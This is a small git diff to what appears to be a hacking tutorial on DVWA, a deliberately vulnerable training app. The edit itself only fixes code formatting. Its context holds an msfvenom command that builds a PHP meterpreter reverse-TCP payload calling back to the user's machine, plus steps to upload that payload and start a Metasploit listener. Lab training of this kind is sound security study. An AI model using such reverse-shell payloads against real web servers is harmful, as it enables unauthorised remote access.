@@ -42,7 +42,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=youripmachine LPORT=4444 -f raw >m
 
 ![image](https://github.com/ELRame/HackingTools/assets/82544416/ea79972c-b9ef-4c1a-acf4-75a3adf10b85)
 
-After this you can go to dvwa and upload the file, once uploaded, you have to go back to metasploit and run the command ````run```` or ´´´´exploit´´´´ in order to put it in listening state:
+After this you can go to dvwa and upload the file, once uploaded, you have to go back to metasploit and run the command ````run```` or ````exploit```` in order to put it in listening state:
 
 ![image](https://github.com/ELRame/HackingTools/assets/82544416/9ba1a9da-0a65-46ae-b255-b11891429edd)
 
